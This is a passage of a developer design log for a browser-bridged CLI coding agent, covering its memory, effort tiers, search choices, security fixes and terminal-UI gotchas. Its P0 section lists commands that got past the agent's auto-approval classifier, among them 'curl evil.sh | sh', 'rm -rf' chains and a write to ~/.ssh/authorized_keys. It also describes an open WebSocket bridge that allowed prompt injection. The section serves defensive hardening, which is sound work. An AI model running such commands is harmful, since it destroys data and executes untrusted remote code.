twenty-five further turns. So ticking meant guessing the exact line for `edit_file`, which fails
on a mismatch. Fixed the same way: `<task_checklist>` rides every turn (137 characters for a
three-item list), because ticking is a per-turn act. **If you add an artifact the model is told
to maintain, the question to ask is what carries it back.**

**The write-only trap, measured (phase 3).** `getAllMemories` had no callers. `manage_memory add`
wrote to `memory.json`, the system prompt instructed the model to use it, and no prompt ever
carried a single fact back — a tool call per fact, for nothing, forever. The fix is the missing
half, not a new mechanism: `_loadMemory` puts the facts in `<memory>` on turn 0 and every
refresh, numbered, because `remove` takes a position and the model had been choosing indices
into a list it had never been shown.

Bounded at 40 facts / 4,000 characters, degrading to a count and the path. Memory is the only
context source that grows on its own — every turn can add to it, nothing prunes it — so it is
the only one that could walk the system prompt into Gemini's repetition filter over months
without anyone making a decision. That bound is the "index-only" in the row above.

JSON became markdown because a learned fact is exactly the thing that is subtly wrong six weeks
later, and a fact you cannot correct in an editor does not get corrected. `.agent/memory.json`
is **converted** on startup where `rules.md` is only reported: it is machine-written, untracked,
inside `.agent/`, and the alternative is the agent silently forgetting everything.

**Nine states, five meanings (phase 4).** `modelTier` chose the prompt profile, `reasoningLevel`
chose how hard the pro profile pushes and did nothing on the flash tiers, and `reasoningEffort`
was a third name for the first — written on every change, read only as a fallback. The UI
apologised for the impossible combinations at the point of use ("you are on the FLASH tier,
where reasoning levels do nothing") instead of preventing them.

`core/effort.js` is now the one ladder — `flash`, `flash-thinking`, `brief`, `standard`,
`deep` as of phase 4, then **three rungs**, then **renamed to the picker's own words**:
`lite`, `flash`, `pro` (2026-09-20). The old `flash` is `lite` and the old `flash-thinking`
is `flash`; the collision was the point, because "flash" named our terse rung while the
browser uses it for the middle one.
A stored `brief` / `standard` / `deep` folds to `pro` on read, *before* the `modelTier`
branch, so a disagreeing legacy tier cannot drop a pro user onto the terse profile.
`modelTier` and `reasoningLevel` survive as *derived* values because the prompt builder really
does branch on both, but nothing stores them separately, so they cannot disagree. Each rung also
names the browser tab it is written for — a pro-tier prompt in a Flash tab is a long prompt to
the model that handles long prompts worst.

`effortFromConfig` folds an existing config on read, preferring the tier over the level when
they contradict (the tier is what the prompt actually branched on). It is deliberately fed the
config *from disk* rather than the merged object: the default `modelConfig` already carries
`effort: 'standard'`, and folding the merge let that default shadow every legacy key — a bug the
pty probe caught and `config-merge.test.js` now covers.

**Why the scope switcher goes (phase 5).** `setScope` rebuilt `SessionStore`, the conversation
history, `MemoryManager`, `ContextManager` and the prompt state in one call — its own doc comment
said switching scope "is closer to opening a different project than to changing a setting". That
is the argument against having it as a setting: the transcript on screen belongs to the old
scope, and the switcher swapped the history out from under those turns while they were still
being displayed. `--scope` at launch and the derived walk reach the same place with no such
window. The name still answers, read-only, because a group user typing `/scope` and getting
"unknown command" learns nothing about `--scope`.

**Why `semantic_search` goes (phase 1).** Measured: its tokenizer splits on non-alphanumerics
only, so `getUserById` is one token and the query `user` can never match it — broken for the
query type that dominates code search. A broken tool is worse than a missing one, because the
model reaches for it and concludes the code is not there. Even repaired it is keyword matching
that `grep_search` already does better, and it costs a full-repo read at every startup. The
madge dependency graph dies with it: it is read only inside `search()`.

**What phase 6 did.** `bridge/extension-lock.js` holds a lane per model — queue, busy flag and
watchdog each — so a ChatGPT review and a Gemini prompt genuinely overlap. Every release path
names its lane (`_releaseExtension(model)`, defaulting to `mainModel`); the subagent path reads
the lane out of `pendingSubagents` *before* `handleSubagentResponse` deletes the entry, which is
the only record of which tab the reply came from.

`topology` is now a getter: `reviewer ? 'duo' : 'single'` (it also required
`reviewer !== main` until ChatGPT was removed). It is not written
to config any more — a derived value in a config file is one someone edits and is ignored for
editing — and a stored `topology` is folded into the reviewer on read. `/mode` and `/config`
became one command and one screen: the role picker, then the model picker, then a "View Current
Config" row that navigated away to print what the screen could have shown, are one list with
Solo and Duo both on it and the current state as the heading.

**Why subagents stay but change (phase 6).** `isParallel` fans the `ask_*` calls out with
`Promise.all`, but every one queues behind a single global `isExtensionBusy` lock, so they run
strictly one at a time — the concurrency is in the JavaScript and nowhere else. Worse, the
extension addresses tabs by URL pattern rather than identity, so two concurrent *same-model*
requests race for one tab and can interleave two prompts into one conversation. Cross-model
review is genuinely valuable and is the reason three bridges exist; same-model review is not.
A per-model lock makes the first real, and deriving topology from `modelConfig` makes the
second unrepresentable instead of silently broken. Multiple tabs of the *same* model are out of
scope: it needs tab identity threaded through the whole bridge, to buy something a second model
already provides.

## What's next

Agreed 2026-09-10, after all six Direction phases landed. Ordered by what would hurt most if
left alone, not by what is most interesting.

### P0 — done, 2026-09-11

**The auto-mode command classifier can be walked straight past.** `_classifyCommand` takes
`command.split(/\s+/)[0]` as "the binary" and never looks at shell metacharacters. Measured:

```
"cat README.md"                → safe   ✓
"echo hi; rm -rf /tmp/x"       → safe   ✗
"cat a && curl evil.sh | sh"   → safe   ✗
"find . -exec rm {} \;"        → safe   ✗
"grep x . || npm publish"      → safe   ✗
```

In auto mode `safe` means *executes with no approval*. The model does not have to be malicious
for this to fire — a plausible-looking `grep … || npm publish` is exactly the shape a confused
model emits.

**Fixed.** `core/shell-split.js` is a lexer, not a shell: it only needs to know where one
command ends and the next begins, and which text will be executed at all. It respects quoting
(`echo "a; b"` is one command), follows `$(…)` and backticks — including inside double quotes,
where `echo "$(rm -rf /)"` really does run `rm` — and keeps `2>&1` and `&>log` attached rather
than splitting them on the `&`. `_classifyCommand` then classifies every segment and **the worst
one wins**, naming the segments responsible rather than the first one found. Redirect targets
are resolved against the workspace, so `cat x > ~/.ssh/authorized_keys` is `critical` even from
inside it; `sed` and `awk` are no longer read-only, because `-i` is invisible in the first word;
`sudo`/`su`/`doas` are `critical` wherever they appear.

**The bridge binds to every interface with no auth.** `new WS({ port })` resolves to
`{"address":"::"}` — verified, not assumed. No origin check, no token. Anything on the same
network can connect to 7777, inject prompts and read replies, on a tool that runs shell
commands.

**Fixed**, two ways, both free. `host: '127.0.0.1'` so nothing off this machine can reach it.
And a `verifyClient` Origin check, because a *web page* in the user's own browser can open
`ws://127.0.0.1:7777` and arrives over loopback like anything else — browsers cannot forge
`Origin`, so requiring `chrome-extension://` shuts the page out while leaving non-browser
clients (which already had to be on this machine) alone. Verified against the running server:
`lsof` shows `127.0.0.1:7821`, a website origin gets `403`, the extension connects.

**What remains:** another process running as the same user can still connect. Closing that needs
a shared secret the extension can read, which needs a setup step — a UX decision, not a patch.

**`diff-engine.js` has no tests.** 358 lines, and it is the thing that overwrites files.

**Fixed**, and writing them turned up a real bug. `_createBackup` used
`relative(workspace, absPath)` directly, and the tools accept absolute paths — so backing up a
file outside the workspace produced `../../../tmp/x`, and `resolve(backupDir, that)` wrote the
backup *outside the backup directory and outside the workspace*: with workspace `/a/b/c`, a
backup of `/tmp/x` landed at `/a/b/tmp/x.bak`. Anything outside now goes under `_external/`.

### P1 — done, 2026-09-11

**Validate tool arguments.** *(done — `mcp/validate-args.js`.)* `zod` is a dependency and
`mcp/mcp-server.js` never imports it.
`TOOL_DEFINITIONS` declares a schema per tool and `PromptBuilder` renders it into the prompt as
*the contract*, then `_extractToolCalls` does `_cleanJsonString` → `JSON.parse` → dispatch with
nothing checking the args against the schema just promised. A wrong-typed arg fails deep inside
a handler with a message the model cannot act on. Validating and returning the specific schema
error for repair is most of what a real tool-call API buys, and it is available today.

Schemas are built from the declarative `parameters` block, so there is one source of truth. It
also **coerces what is obviously meant** — `"10"` for a number is a working turn that used to be
thrown away — but deliberately *not* booleans the same way: `Boolean("false")` is `true`, which
would silently invert `isRegex` and `recursive`, the two flags where it matters most. The words
are read explicitly instead.

**The workspace commands, the way `/scope` went in phase 5.** *(done.)* `setWorkspace` rebinds
`mcpServer`, `promptBuilder`, `diffEngine` and `contextManager` but *not* `sessionStore`
(deliberately), *not* `memoryManager`, and *not* the config. So after `/workspace`:
`promptBuilder._loadMemory()` reads the new project's `memory.md` while `manage_memory add`
writes to the old one, and the old project's allowlist stays armed against the new project.
`/agent-dir` goes outright — tools already take absolute paths (`edit-file.js:15`) and the
system prompt already grants self-editing, so it unlocks nothing and silently repoints state.
`/workspace` becomes read-only; `/set-workspace` becomes a *restart* picker, which the exit-75
supervisor now makes possible. The choice is left in `~/.agent/next-workspace` and `src/index.js`
consumes it on relaunch — a file, because the child cannot rewrite its own argv, and read-once,
because a stale handover would silently override `--workspace` on every later start.

**Settings rows can outgrow the viewport.** *(done.)* `describeSettings` padded to a fixed width
with no bound against terminal width, so long values wrapped — in the live frame, which is the
one place that must never happen. The hint truncates first: it is the part you can lose and
still know what the setting is set to. Verified at 72 columns.

**Instrument `looksLikeMultipleDrafts`.** *(done — `op: 'multiple_drafts'`.)* The other two
detectors logged and this one did not, so there was no evidence it had ever fired at all —
exactly the state in which a detector that works cannot be told from one that does nothing.
`/logs agent` answers it now. **Still to do: read it after a week of use and decide.**

**Characterisation tests for `agent-loop.js`.** *(started.)* `_extractToolCalls` is covered —
it is what stands in for a tool-call API here, so it is the most load-bearing text processing
in the project, and it turned out to handle every adversarial case put to it: braces inside
strings, nested objects, raw newlines in string literals, and unfenced JSON. The retry and
dispatch paths still want scaffolding and are left for the split in P3.

### P2 — features

- **Settings tabs** — *done.* Three (`Settings · Status · Context`), because those are the
  three questions people open the page to ask; a fourth tab with two rows in it is a worse
  answer than a third tab with six. **Tab** cycles them, not ←/→, which the filter field needs
  for its cursor — inside a menu the agent's own bindings are inert, so tab is free there and
  nowhere else. Typing searches *every* tab and says so, because making someone find the right
  tab before they can search is asking them to know the answer first. Escape clears a filter
  before it closes the page. `/context`'s numbers live on the Context tab too.
- **`server/src/prompts/*.md`** — *done, partly.* The point is not readability: a prompt change
  was invisible in a diff, one word inside a template literal in a 1,000-line file, and that
  file is the one with the never-bulk-edit-with-a-regex warning. Template literals also have
  escaping rules that prose does not — a single stray backtick there surfaces as
  `ReferenceError` from an unrelated function.

  Only **static** prose moved (~116 lines, seven files): the two cheap-rung protocols,
  both tool-call formats, the terse core rules, the pro guardrails and the plan-first step.
  The files were named after the rungs and moved with them in 2026-09-20's rename —
  `reasoning-lite.md` / `reasoning-flash.md`, and `core-terse.md` /
  `tool-call-format-terse.md` for the two that serve *both* cheap rungs. Anything the builder computes stays in JavaScript, because a markdown file
  full of `${isBrief ? '2' : '3'}` is worse than what it replaced. The move was verified
  byte-for-byte: all ten effort × topology prompt shapes came out identical, and one did not
  at first — `trimEnd()` had eaten a trailing newline that the assembled prompt depended on.
  `prompt-loader.test.js` guards it.

  **Generating the tool definitions — done, 2026-09-16.** It could not be done as originally
  described: `ask_question`, `ask_subagent`, `ask_researcher`, `ask_reviewer` and `manage_memory`
  are dispatched in `agent-loop.js` and were in no array at all, so there was nothing complete to
  generate *from*. `core/tool-catalog.js` is that list — all eighteen, declared once, with which
  tier sees what and which topology offers it — and `_buildToolDefinitions` is now two lines that
  assemble it. `_buildToolAnchor` and `_buildToolIndex` already derived from that method, so they
  followed for free.

  The text was moved mechanically rather than retyped, and all twenty shapes (five efforts × two
  topologies, tool block and full turn-0 prompt) come out byte-identical — two runs of that
  comparison caught two real transcription faults first. `runHeadlessTask`'s list stays its own
  text, because it is a deliberate subset in a different shape carrying a correction the full
  definitions do not; its *membership* is checked against the catalog instead.

  `toolCatalogDrift()` reports all three disagreements rather than throwing on the first — a tool
  that runs but is never described, one described that nothing dispatches, and a required
  parameter missing from the prose. Each branch has a negative control, because a drift check
  that compares an empty list to an empty list passes forever.
- **Extension error richness** — *done.* The bridge already read `payload.op`/`stage`; nothing
  sent them. Service-worker errors now carry `op`, `stage`, `targetModel` and the DOM-side
  message that actually failed. Content scripts run in the page and cannot set fields on that
  payload, so they prefix `[stage]` to their message and the bridge lifts it back out — a
  changed selector on gemini.google.com now logs as `find_input` rather than "failed".
- **The ChatGPT bridge's image path** — *fixed, then deleted with the bridge.* Kept as a
  record of the failure mode: it matched the `<image_data>` block and **deleted** it, then
  pasted the remaining text, so `/image` sent a prompt discussing a screenshot nobody had been
  given. A scrape that silently drops what it cannot handle looks identical to one that
  works.
- **`grep_search` for large repos** — *done.* Several patterns in one call (`["rate limit",
  "throttle", "quota"]` is one search, not three round trips), optional context lines capped at
  five, and results grouped by file with the busiest file first — on a large repo the module
  that owns a concept is usually the one that mentions it most. Fifty flat rows also repeated
  the path fifty times, and every one of those characters is retyped into the browser next turn.
  It probes one match past `maxResults` so it can tell "exactly fifty" from "fifty and we
  stopped counting": ripgrep's `--max-count` caps *per file*, so without the spare there is
  never a surplus to notice. See "Search, and why there is still no index".

### P3 — done, 2026-09-11 (except the GitHub restructure)

- VS Code terminal shell integration — *done.* The companion forwards **failed** commands only,
  and only their tail, to `.agent/state/terminal.jsonl`; the CLI drains it into the input box as
  a marker you send or delete. It offers rather than acts: an agent that starts editing because
  a command you ran in another window failed is a worse tool than one that waits to be asked.
  Engine `^1.80.0` → `^1.93.0`, repackaged as `cli-agent-companion-1.4.0.vsix`.
- Native folder picker — *done.* `/skills dir add` with no path, and Browse… in the workspace
  picker. macOS, zenity, kdialog or PowerShell, and offered **only** where one exists: a menu row
  that silently does nothing is worse than no row, because people press it twice and conclude the
  tool is broken.
- **Restructure the GitHub PR agent** — 1,649 lines, the largest single feature here. Not
  deleted, and **not started**: the owner asked for it to be planned on its own once everything
  else had landed. It now is. This is the next thing to plan.
- Split `agent-loop.js` — *done.* The sixteen-case slash-command switch moved to
  `core/slash-commands.js` as a function taking the loop, so the dependency reads in the
  signature instead of as seventeen implicit `this.` references. 1,910 → 1,594 lines, interface
  unchanged. This is what unblocks generating the tool definitions: `ask_question`,
  `ask_subagent`, `ask_researcher`, `ask_reviewer` and `manage_memory` are still dispatched from
  inside `agent-loop.js` and need declaring somewhere first.
- A **symbol index** — `find_symbol` / `find_references`, from tree-sitter or ctags. The
  structural half of what a large codebase needs, and the half grep is worst at.

### Search, and why there is still no index

Decided 2026-09-11, revisited deliberately because the next codebase is a large one.

**No embedding index.** Phase 1 deleted `semantic_search` for being broken; this is the
separate question of whether a *working* one should replace it. It should not, and Claude Code —
the benchmark this project is measured against — does not have one either. Four reasons, the
last of which is specific to this architecture:

- Code search is mostly **exact-symbol** search (`getUserById`, `EADDRINUSE`), where lexical
  matching wins outright.
- An index goes **stale on every edit**. Cursor pays for a persistent background service to
  re-index continuously; the alternative is serving the model a confident map of code that no
  longer exists — the same failure phase 1 removed.
- **Chunking destroys structure.** This repo already learned that: the deleted `ast-chunker`
  resolved 24% of its own top-level symbols.
- **Retrieval is single-shot; an agent iterates.** grep → read → grep again with a better term
  beats one shot at the twenty nearest chunks, because the second query knows what the first
  found.

The constraint that settles it: **the context window is a browser chat tab.** Every retrieved
chunk is typed into Gemini by a content script. Twenty 500-token chunks is 10,000 tokens typed
into a browser per query, most of it unread — in a project whose whole prompt strategy exists to
avoid large repeated payloads. Agentic grep→read sends only what the model decided it needed.

**What a large codebase actually needs**, none of which is RAG:

| gap | answer | where |
| --- | --- | --- |
| you don't know the codebase's word for it ("rate limit" vs `throttle`) | multi-pattern `grep_search`, and prompt guidance to try synonyms — the model already knows them, it just burns a browser round-trip per guess | P2 |
| "who calls this?", "what extends this?" | a symbol index (tree-sitter or ctags): exact, invalidates on mtime, needs no model | P3 |
| orientation in an unfamiliar repo | `AGENT.md` — a human-written map beats a generated one because someone vouched for it | done, phase 2 |
| a 50-line unranked hit list is hard to reason from | context lines, grouping by file, ranking | P2 |

This is a decision made from the architecture, not from measurement. If grep genuinely fails on
real questions in the large codebase, that evidence outranks the argument above — and the shape
of the failures says which of the four rows is the one that bites.

### Raised, not yet planned

Two things the owner asked to come back to once the phases were done:

**Session logs as post-compaction recall.** Compaction replaces older turns with a summary, and
anything it dropped is gone from the model's view — but not from disk: `sessions/history.jsonl`
still holds every turn. A tool that lets the model look back into its own history would turn
"compaction ate the detail" from a loss into a lookup. Probably better than making compaction
smarter, because it does not require deciding in advance what will matter.

**Search for really large codebases.** `grep_search` now takes several patterns, context lines
and groups by file (P2), and the reasoning for *not* adding an index is recorded above. That
decision was made from the architecture, not from measurement — the next codebase is the
measurement.

**The extension.** Chrome throttling of background tabs, the retry behaviour around it, and
whatever else the bridge is papering over. Raised 2026-09-11, to be planned rather than patched.
**Answered 2026-09-17** — see "Bridge liveness" above, and "The clock was the only throttled
thing" below.

**`/skills` needs a proper look.** The list is aligned and reachable from settings now, and
escape steps back — but the shape of the feature was not examined. `/skills dir` prints a
four-entry search path; `skillFolders` is an escape hatch from config; creating one opens an
editor. Whether that is the right set of moves is an open question, not a bug list.

### The fork

The agent layer's ceiling is not code quality, it is the absence of a tool-call API. Three
responses, ascending:

**A. Make the text channel as good as it gets** — P1's validation plus a sentinel-delimited
call block. Free, no product decisions.

**B. Measure before believing.** `parse_tool_calls`, `tool_amnesia`, `provider_error` and
`multiple_drafts` are logged, and **`/logs rates` reads them back as rates** —
`core/channel-health.js`, gated at `MIN_TURNS_FOR_RATE` so a handful of turns cannot look like
a trend. This note used to say nothing read them; that stopped being true and the note did not
follow, which nearly bought a second implementation of a view that already shipped.

First real reading, 99 turns on the owner's machine: unparseable tool call **0%**, denied
having tools **1.0%**, provider error **0%**, multiple drafts **0%**. The text channel is in
better shape than the estimates in this file assume — which is the point of having the number
rather than the estimate.

**C. An optional API backend.** The only option that actually removes the ceiling: structured
calls, real parallelism, caching, and `looksLikeCapabilityDenial` plus half of `PromptBuilder`'s
economics become dead code. It contradicts the standing "no API keys" decision above, so it is
recorded as a fork, not a plan. The framing that preserves the thesis: the browser bridge stays
the default and the identity of the project; an API backend is opt-in for people who already
have a key.

**Prompts typed during a turn are queued, not dropped.** `handleUserMessage` returns early
when busy, pushing a transient status line the thinking cycle paints over — and by then
`handleSubmit` has echoed the message into the transcript and cleared the input box. It looked
sent, the text was gone, and nothing would ever answer it. Reported as four prompts typed and
one reply. `queuedUserMessage` had sat on the loop as a field that nothing read or wrote.

The queue lives in the UI, because that is where the transcript and the marker are, and
because "one turn at a time" is the contract that keeps the loop tractable. Busy is read from
`agentLoop.isProcessing`, never React's copy — `handleSubmit` sets that itself. Draining is
gated on the loop being idle *and* no diff prompt or menu being open, because the two flags
disagree during an approval and draining then injects a prompt into a turn parked on a
decision. `:stop` empties the queue, or stopping is followed instantly by the next prompt.

**Up-arrow takes a queued prompt back** when the box is empty — press enter and it rejoins the
queue, press nothing and it is gone, which is the cancel nobody had to invent a key for. Only
when the box is empty: half a typed sentence must not be replaced by something queued a minute
ago.

## Gotchas

- **`server/src/index.js` is the bin and does nothing but re-spawn `main.js` under `tsx`** —
  the sources contain JSX, so plain `node src/main.js` fails.
- `App.jsx` is performance-sensitive: it avoids re-rendering during streaming to prevent
  terminal tearing, and uses raw ANSI (`\x1b[1m`) in places because `marked-terminal` mangles
  inline markdown inside list items. It was split into `ui/` modules by moving blocks verbatim
  behind explicit dependency lists; the `<Static>` element, `staticEpoch` and the streaming
  path stayed in `App.jsx` deliberately, and adding memoization to the transcript rows is how
  the scroll glitches came back the last two times.
- **Every slash command is driven once by a test, bare and with arguments.**
  `use-slash-commands.js` was 967 lines at **8.69% line coverage** — the lowest
  in the repo, and the surface almost every bug reported from use has come from.
  `test/ui/slash-command-smoke.test.js` is shallow and total, the same shape as
  the tool smoke sweep and for the same reason: the failure worth guarding is
  "this entry point throws", and a command that crashes takes the turn with it.
  It also asserts no listed command answers *"No such command"* about itself —
  the `/name` bug, which shipped fully implemented and unreachable because the
  dispatcher kept its own copy of the list. **55.5% now, and 92.5% overall.**

  **Use the real collaborators, not stubs.** A first pass with hand-written
  stubs produced three confident false positives, including `getAllMemories is
  not a function` against a method that exists and has three callers. Real
  `MemoryManager`, `ContextManager`, `DiffEngine` and `TaskManager` cost nothing
  in a temp workspace and cannot lie that way.

  Two real faults fell out of the sweep, both the same shape — the interface not
  saying what happened. **A wrong effort word was ignored rather than
  rejected**: `/effort deeep` fell through to the status display, which prints
  the current rung and the ladder and reads exactly like a confirmation, so you
  believe it changed and every later turn goes out on the old rung. And **a bare
  `/` answered "No such command: `/`" followed by "Type `/` on its own to see
  what there is"** — advice to do the thing that had just been done. It lists
  the commands now, and an unknown command says so *and then* lists them.

- **A local command must not touch a running turn.** `handleSubmit` set
  `isProcessing` and cleared `activeToolCalls` before looking at what was
  submitted, and every slash handler ends with `setIsProcessing(false)` — so
  typing anything starting with `/` mid-turn wiped the live turn's rows and
  then declared it finished while the loop carried on. Reported as `/efforttt`
  during a turn and "the agent stopped responding and did not output the
  result": it had not stopped, it had run the tool calls and produced the
  answer. `turnInFlight` is read from **`agentLoop.isProcessing`**, not from
  React's copy, which this very function sets true. Pinned by a source
  assertion, because observing it needs a live turn under the pty harness and
  because moving two `set…` calls back above the branch reads as tidying.

  **The transcript only advances on `agent_response`** — `mergeLoopHistory`
  runs in that one branch of `sendToPanel` — and `agent_response` is only sent
  when a reply has prose left after the tool calls are stripped. So a round
  that is *only* tool calls leaves the screen exactly as it was. That is why
  the report looked like a dead agent rather than a busy one, and it is still
  the case: the live tool rows are the only sign of progress during those
  rounds, which is precisely what the bug above was wiping.

- **An instant local command must not raise a spinner it takes down again.**
  Reported with a screenshot: a `Thinking… (0s · ↑ 29.4k tokens · esc to stop)`
  row sitting above `❯ /paste-image` and another above `❯ /image`, both frozen
  at 0s, permanently in the scrollback. `handleSubmit` set `isProcessing(true)`
  for *anything* starting with `/`, and every handler ends by setting it false —
  so an instant command drew the live row, committed its own output to
  `<Static>` in between, then shrank the live frame, stranding the row above the
  static write where Ink can never repaint it. **Above** the command, because it
  was drawn before the rows it ends up sitting on. `SLOW_COMMANDS`
  (`core/slash-commands.js`) is the gate, and `/compact` is its only member:
  it asks the model for a summary, `/new` fires `startNewChat` without awaiting
  it, and the rest is arithmetic on state already in memory. A set beside the
  commands rather than a literal at the call site, because the literal is what
  drifts.

- **An attached image can be taken off again, and says that it is on.**
  Reported from use: *"there is no option to remove image? how to do that?"* —
  and there was not. `setPendingImage(null)` ran in exactly one place, on
  submit, so once attached the only ways to be rid of it were to send it or
  restart. It had no representation either: the transcript said so once and
  scrolled away, so the only way to find out an image was armed was to send it.
  `/image remove` detaches, and the status row carries `1 image` beside the
  paste count — the same field pattern, in a row that is already drawn and
  already budgeted, costing nothing when there is no image.

- **A menu opened from `/settings` must not answer in the transcript.** `returnTo` is the
  settings page, so setting it back reopens that page *on top of* whatever the command just
  said. Four screens did this — `/effort`, `/config`, and two on the allowlist — and the
  symptom is a setting that changes with no sign it did. `applyAndReturn` in `Menus.jsx` is
  the one rule: go back and say nothing (the row is the confirmation and re-reads live
  state), or close and let the transcript answer. And a menu that mutates shared state needs
  a fresh `activeMenu` object — `commandRules` is shared by reference, so the values were
  already right and React simply had no reason to repaint.
- **The live frame must never outgrow the viewport.** This is the single most important rule in
  `ui/`. When Ink's dynamic output is taller than the terminal, `shouldClearTerminalForFrame`
  (`ink/build/ink.js`) switches it to writing `ESC[2J ESC[3J` plus a full repaint on *every*
  render. Measured on the pre-fix code, sitting idle with a 12-turn history in a 24-row
  terminal: 108 full clears and 108 scrollback wipes in 15 seconds, 3.85 MB of escape codes.
  That is what "it flickers and I can't scroll or copy" was — the terminal's scrollback and the
  user's selection were being deleted seven times a second. The same shape is now 36 KB and
  zero clears. So: settled turns go to `<Static>`, only the in-flight turn is live, and every
  live row is bounded by `liveBudget` (`terminalHeight - RESERVED_ROWS`). Adding an unbounded
  row to the live region — a full tool result, an artifact dump, a list that grows — brings the
  whole thing back.

  **And it can overflow from below, which is newer.** `liveBudget` has a floor, so the frame had
  a *minimum* height of `RESERVED_ROWS + 3 = 12` rows and any shorter terminal overflowed however
  much the in-flight turn gave up. Measured, one turn, extension connected: 13 rows → 0 clears,
  12 → 1, **10 → 166**. Three of the nine reserved rows are pure spacing, so below
  `COMPACT_BELOW_ROWS` (13) they are dropped and the floor comes down with them — spacing is what
  gets shed, never a row carrying information. That moves the floor to 9 rows; 8 still costs
  thirty clears, which is now a documented limit rather than a silent one. Asked whether
  *resizing* glitches: it does not — a drag firing five SIGWINCH events produces exactly one
  debounced reprint, and the control run that never resizes is identical.

  **The floor is one row now, and used to be three.** `Math.max(3, …)` never meant "at least
  three if there is room" — it meant three even when there is not, and the frame then asks
  for more rows than the terminal has. It was the bug twice: once from the furniture above,
  and again when `/update`'s two notice rows reproduced it at 13 rows (9 + 2 + a floored 3 is
  14). Whenever there *is* room the subtraction already yields more than three, so the floor
  only ever bound in the case where binding it was wrong.

  **The agent's reply was the unbudgeted row, and it was the biggest one.**
  `TranscriptTurn` capped the *action* rows at `liveBudget` and then rendered
  the reply underneath in full, live or not. Reported as "it gave me much more
  output but I received only a portion of it", with a screenshot of an answer
  cut mid-sentence and blank space below. **Nothing was lost** —
  `history.jsonl` held all 5,090 characters and `renderMarkdown` returns all of
  them, both checked before touching anything — but at ~85 rendered rows in a
  ~30-row terminal the frame blew past the viewport, and what survived the
  repaint was its top. `liveMessageText` clamps it while live and says
  `… +N more lines`; the committed copy in `<Static>` is untouched, so the rest
  appears a moment later. It lives in `format.js` rather than beside its only
  caller because a test importing a `.jsx` file cannot run under the repo's
  plain `node --test`.

  **Its first version counted `\n`, which was the same bug again, and it
  shipped looking fixed.** It was reported a second time — extension updated,
  agent restarted, still truncated, still no marker. A 1,450-character reply
  is **18 source lines and 26 rendered rows at 100 columns**, so an 18-line
  clamp against a 14-row budget let the text straight through while the frame
  still overflowed by twelve rows. The rule immediately below had already
  said it. The budget is spent in *wrapped* rows now, at the width the
  terminal actually is. **A clamp measured in the wrong unit reads as a fix
  and behaves as nothing.**

  **A row you draw is a row you budget, and a row that wraps is two.** `/update`'s reload
  notice was ~105 characters, which wraps at 80 columns: charged as one row, drawn as two,
  and 1 `ESC[2J` at 13x80 and 10x80 where there had been none. `wrap="truncate"` on anything
  in the live frame is load-bearing, not tidiness. The arithmetic test caught the first of
  these; only the pty run caught the second.
- **Nothing the user waits for goes in front of the first frame.** Startup was
  2.46s to the prompt box with GitHub enabled, and almost none of it was work:
  `main.js` awaited the 1.5s extension-greeting timeout and then
  `githubHandler.start()` — which authenticates against api.github.com and runs
  a full initial poll, fanning out per PR — before it created the Ink UI.
  Neither answer is something the first frame draws. Moving both behind
  `cli.start()` took the same measurement to **0.53s**, with no behaviour change:
  the start tab still opens, the poller still polls. For scale, every module
  import in the process is 517ms together, 426ms of it ink+react, and `tsx`
  itself is 120ms — so the two waits were larger than the entire program.
  `test/core/startup-order.test.js` pins the ordering, because the regression is
  invisible in review: one more `await` before `cli.start()` reads as ordinary
  sequencing and costs a second every launch, with no failure to notice.

  **Starting GitHub after the WebSocket server also fixed a silence.**
  `poller.start()` emits `auth_rejected`, and its only listener is wired in the
  `WebSocketServer` constructor — which used to run *after* that call. So the
  401 message ("GitHub rejected the stored token… clear it with
  `/github remove-token`") was emitted into an EventEmitter with nobody
  attached, and an expired token produced no GitHub activity and no reason why.
  The later `pollNow()` 401 at `github-poller.js:147` always worked; only the
  startup one was unreachable.

- **A row in the live frame is truncated from the right, so put the part that
  must survive on the left.** The filed-session row read `↺ Previous
  conversation filed (2 turns) — --resume <28-char id>`, which is ~80
  characters: at 80 columns `wrap="truncate"` ate the end of the id and offered
  a `--resume` that resumes nothing. Leading with the id and trailing the prose
  costs nothing and degrades correctly — at 60 columns the sentence is cut and
  the command is still intact.

- **No mouse tracking, ever.** Terminal mouse reporting and native scroll are mutually
  exclusive: a terminal that is tracking hands the app the wheel and suppresses drag-select. The
  app therefore enables nothing, and `cli-ui.jsx` writes the disable sequences once on startup
  in case a crashed run left the terminal tracking. Scroll, drag-select and copy are the
  terminal's, exactly as in Claude Code. Everything that used to be clickable is a keybinding.
- **The transcript has no selection model.** `Ctrl+E` toggles verbosity for the *whole*
  transcript rather than one row, because there is nothing to point at a single row with. Ink
  cannot repaint what `<Static>` has committed, so `toggleVerbose` clears the screen and lets
  Static print the transcript again at the new setting — that one clear per keypress is
  deliberate and is the only `ESC[2J` the app writes. ↑/↓ always mean input history.
- **`ink-text-input` types every key it does not recognise.** Its handler special-cases exactly
  one chord, ctrl+c, so a ctrl+e handled in `useKeyBindings` still left a stray `e` in the
  prompt — and ctrl+o, ctrl+t and ctrl+v their letters. Ink offers no way to stop a `useInput`
  handler running, and the text field's is registered first (child effects run before the
  parent's). So the chords never reach Ink at all: `cli-ui.jsx` pulls them out of the stdin
  chunk via `hotkeys.js` and dispatches them through `use-hotkeys.js`. Adding a new ctrl+ binding
  means adding it to `HOTKEYS`, not to `useKeyBindings`.
- **A paste is folded to a marker, not typed into the prompt.** `usePaste` (Ink 7) turns on
  bracketed paste, which is the only thing that distinguishes "pasted forty lines" from "typed
  forty lines very fast" — and it keeps the text off `useInput` entirely. `paste.js` swaps
  anything over four lines for `[Pasted text #1 +42 lines]` and `App.handleSubmit` expands it on
  the way to the model. This is a frame-budget rule as much as a legibility one: the input box
  is in the live frame, and a pasted file is the easiest way to blow the viewport.
- **Ink never reads the real stdin.** `cli-ui.jsx` pipes `process.stdin` through a PassThrough
  so `enter-splitter.js` can peel a trailing `\r` into a chunk of its own. Ink's input parser
  deliberately does not split `\r` from adjacent text (a CR can sit inside a paste), so when the
  terminal delivers the last typed character and the Enter after it in one read — routine when
  typing fast, over ssh, in tmux, or on key repeat — Ink sees `"i\r"` with `key.return` false,
  `ink-text-input` types the CR into the prompt, and **the message is silently never sent**. The
  second write is deferred with `setImmediate`, because Ink's `read()` drains everything
  buffered and two back-to-back writes would arrive as the one chunk this exists to split.
- Running the CLI without a TTY fails with Ink's "Raw mode is not supported". That is the
  harness, not a bug — use `script -q /dev/null <cmd>` to test under a pty.
- Content-script DOM selectors break when the chat sites change; `extractLatestResponse` must
  wait for a *new* block before scraping. Gemini's editor only ingests text via a synthetic
  `ClipboardEvent('paste')` — setting `innerHTML` breaks it.
